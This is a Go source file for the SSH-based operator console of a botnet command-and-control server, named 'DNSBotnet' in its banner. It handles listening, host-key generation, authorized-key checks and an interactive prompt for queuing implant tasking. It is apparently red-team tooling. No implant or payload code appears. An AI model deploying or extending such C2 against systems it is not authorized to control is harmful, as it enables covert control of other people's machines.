package main

/*
 * ssh.go
 * Handle SSH plumbing
 * By J. Stuart McMurray
 * Created 20180211
 * Last Modified 20180211
 */

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/subtle"
	"crypto/x509"
	"encoding/binary"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
)

// StartC2 starts the C2 listener and handler.  It returns when the listener
// is listening and ready to handle clients, or if an error occurred.
func StartC2(c2Addr, keyF string) error {
	/* Warn the user if we haven't an authorized keys file */
	if "" == AKFILE {
		log.Printf(
			"WARNING: All C2 connections allowed due to " +
				"missing authorized keys file.",
		)
		log.Printf("Oh, dear.")
	} else {
		/* Warn the user if the authorized keys file is empty */
		fi, err := os.Stat(AKFILE)
		if nil != err {
			return err
		}
		if 0 == fi.Size() {
			log.Printf(
				"WARNING: No authorized keys found in %v",
				AKFILE,
			)
		}
	}
	/* Server config */
	conf := &ssh.ServerConfig{
		PublicKeyCallback: checkCert,
		ServerVersion:     SSHVERSION,
	}

	/* If the key doesn't exist, create it */
	if _, err := os.Stat(keyF); os.IsNotExist(err) {
		if err := makeSSHKey(keyF); nil != err {
			return err
		}
		log.Printf("Made SSH key in %v", keyF)
	}

	/* Read key, add to config */
	kd, err := ioutil.ReadFile(keyF)
	if nil != err {
		return err
	}
	s, err := ssh.ParsePrivateKey(kd)
	if nil != err {
		return err
	}
	conf.AddHostKey(s)
	log.Printf("Read SSH key from %v", keyF)

	/* Print key fingerprints */
	pk := s.PublicKey()
	log.Printf(
		"Legacy MD5 SSH key fingerprint: %v",
		ssh.FingerprintLegacyMD5(pk),
	)
	log.Printf(
		"SSH key fingerprint: %v",
		ssh.FingerprintSHA256(pk),
	)

	/* Listen for connections */
	l, err := net.Listen("tcp", c2Addr)
	if nil != err {
		return err
	}
	log.Printf("Listening for SSH C2 connections on %v", l.Addr())

	/* Start accepting in the background */
	go func() {
		for {
			c, err := l.Accept()
			if nil != err {
				log.Fatalf(
					"Unable to accept C2 connection: %v",
					err,
				)
			}
			go handleC2(c, conf)
		}
	}()

	return nil
}

/* checkCert checks whether a client's certificate is allowed */
func checkCert(
	conn ssh.ConnMetadata,
	key ssh.PublicKey,
) (*ssh.Permissions, error) {
	/* If we have no authorized keys file, everybody is allowed */
	if "" == AKFILE {
		log.Printf("[AUTH] No authorized keys file specified")
		return nil, nil
	}

	/* Try to open authorized keys file */
	f, err := os.Open(AKFILE)
	if nil != err {
		log.Printf(
			"[AUTH] Unable to open authorized keys file: %v",
			err,
		)
		return nil, errors.New("server error")
	}

	/* Marshal attempted key into something checkable */
	try := key.Marshal()

	/* Check each line to see if any match */
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		/* Read a line */
		l := scanner.Bytes()
		/* Ignore blank lines and comments */
		if 0 == len(l) || '#' == l[0] {
			continue
		}

		/* Turn line into a key */
		k, _, _, _, err := ssh.ParseAuthorizedKey(l)
		if nil != err {
			log.Printf(
				"[AUTH] Error parsing authorized key "+
					"line %q from %v: %v",
				string(l),
				AKFILE,
				err,
			)
			return nil, errors.New("authorization error")
		}
		/* See if it's a match */
		if 1 == subtle.ConstantTimeCompare(try, k.Marshal()) {
			return nil, nil
		}
	}

	/* No matching key found */
	return nil, fmt.Errorf("unauthorized (%q)", conn.User())
}

/* makeSSHKey generates an SSH private key in the file named fn */
func makeSSHKey(fn string) error {
	/* Open output file */
	f, err := os.Create(fn)
	if nil != err {
		return err
	}
	defer f.Close()
	/* Generate key */
	rk, err := rsa.GenerateKey(rand.Reader, KEYLEN)
	if nil != err {
		return err
	}
	/* Write it to the file */
	if err := pem.Encode(f, &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(rk),
	}); nil != err {
		return err
	}
	return nil
}

/* handleC2 handles a C2 client.  It reads a line for the implantID, and a line
with tasking, and it queues up the tasking. */
func handleC2(c net.Conn, conf *ssh.ServerConfig) {
	tag := fmt.Sprintf("[C2-%v]", c.RemoteAddr())
	log.Printf("%v Connected", tag)
	defer c.Close()
	defer log.Printf("%v Disconnected", tag)

	/* Upgrade to SSH */
	sc, chans, reqs, err := ssh.NewServerConn(c, conf)
	if nil != err {
		log.Printf("%v Handshake error: %v", tag, err)
		return
	}
	defer sc.Close()
	log.Printf(
		"%v Authenticated as user %v (client version %s)",
		tag,
		sc.User(),
		sc.ClientVersion(),
	)

	/* Handle requests.  We really shouldn't get many different ones */
	go func() {
		for req := range reqs {
			switch req.Type {
			case "keepalive@openssh.com":
				go req.Reply(true, nil)
			default:
				log.Printf(
					"%v SSH global request: %v %q",
					tag,
					req.Type,
					string(req.Payload),
				)
				go req.Reply(false, nil)
			}
		}
	}()

	/* Handle channel requests.  These happen when someone is interactively
	connected. */
	nsess := uint(0) /* Per-connection session counter */
	for nc := range chans {
		switch nc.ChannelType() {
		case "session": /* Interactive session */
			/* Accept the session and handle it */
			ch, creqs, err := nc.Accept()
			if nil != err {
				log.Printf(
					"%v Unable to accept session: %v",
					tag,
					err,
				)
				return
			}
			go handleSession(ch, creqs, fmt.Sprintf(
				"[C2-%v-s%v]",
				sc.RemoteAddr(),
				nsess,
			))
			nsess++
		default: /* We don't serve anything else */
			log.Printf(
				"%v Unhandled channel type: %v %q",
				tag,
				nc.ChannelType(),
				string(nc.ExtraData()),
			)
			nc.Reject(
				ssh.UnknownChannelType,
				"unknown channel type",
			)
		}
	}

	/* Wait for any other teardown to happen before we return and close
	the TCP connection */
	sc.Wait()
}

/* handleSession handles the actual interaction with the user */
func handleSession(ch ssh.Channel, reqs <-chan *ssh.Request, tag string) {
	log.Printf("%v Start", tag)
	defer log.Printf("%v End", tag)
	defer ch.Close()

	/* Make this a PTY.  In the future, we may handle a normal stream. */
	t := terminal.NewTerminal(ch, "> ")

	/* Print a nice and friendly message to the user */
	if _, err := fmt.Fprintf(
		t,
		"Welcome to the DNSBotnet Server!\n\n%v\n\n",
		C2HELP,
	); nil != err {
		if io.EOF != err {
			log.Printf("%v Error sending welcome: %v", tag, err)
		}
		return
	}

	/* Handle requests, expect to get a lot of strange ones */
	go func() {
		for req := range reqs {
			switch req.Type {
			case "shell": /* Shell request */
				/* We've already started something */
				req.Reply(true, nil)
			case "pty-req": /* PTY request */
				handlePtyReq(tag, t, req.Payload)
			case "window-change": /* Window size change */
				handleWindowChange(tag, t, req.Payload)
			case "env": /* Don't care */
				continue
			default:
				log.Printf(
					"%v Unhandled request: %q %q",
					tag,
					req.Type,
					string(req.Payload),
				)
				req.Reply(false, nil)
			}
		}
	}()

	/* Will be used for printing output and beacons */
	c := NewC2Client(tag, t, ch.Close)
	CLIENTS.Add(c, struct{}{})
	defer CLIENTS.Remove(c)

	var (
		l   string /* Read line */
		err error
	)

	/* Read commands, handle */
	for {
		/* Get a command */
		l, err = t.ReadLine()
		if nil != err {
			if io.EOF != err {
				log.Printf("%v Read error: %v", tag, err)
			}
			break
		}
		/* Skip blank lines */
		l = strings.TrimSpace(l)
		if "" == l || strings.HasPrefix(l, "#") {
			continue
		}
		/* Handle command */
		if err = HandleC2Command(c, l); nil != err {
			if io.EOF != err {
				log.Printf("%v Command error: %v", tag, err)
			}
			break
		}
	}
	c.evictOk = true

}

/* handleWindowChange handles the payload of a window-change request.
Specifically, it sets the width and height of the terminal to the size in the
payload */
func handleWindowChange(tag string, t *terminal.Terminal, payload []byte) {
	/* Payload should be exactly 16 bytes */
	if 16 != len(payload) {
		log.Printf("%v Bad window-change payload: %02x", tag, payload)
	}
	/* Width and height as integers */
	w := binary.BigEndian.Uint32(payload[0:4])
	h := binary.BigEndian.Uint32(payload[4:8])
	if 0 == w || 0 == h {
		log.Printf("%v Request for odd window size %vx%v", tag, w, h)
		return
	}
	t.SetSize(int(w), int(h))
}

/* handlePtyReq handles requests for a PTY.  In practice, one is always
assumed, so this is only used to set the initial terminal size */
func handlePtyReq(tag string, t *terminal.Terminal, payload []byte) {
	/* First is a string containing the terminal type.  We don't need it */
	if 4 > len(payload) {
		log.Printf("%v Really short PTY request: %02x", tag, payload)
	}
	l := binary.BigEndian.Uint32(payload[:4])
	if 2+int(l) > len(payload[4:]) {
		log.Printf("%v Short PTY request: %02x", tag, payload)
	}
	payload = payload[4+l:]
	/* Width and height as integers */
	w := binary.BigEndian.Uint32(payload[0:4])
	h := binary.BigEndian.Uint32(payload[4:8])
	if 0 == w || 0 == h {
		log.Printf("%v Request for odd terminal size %vx%v", tag, w, h)
		return
	}
	t.SetSize(int(w), int(h))
}
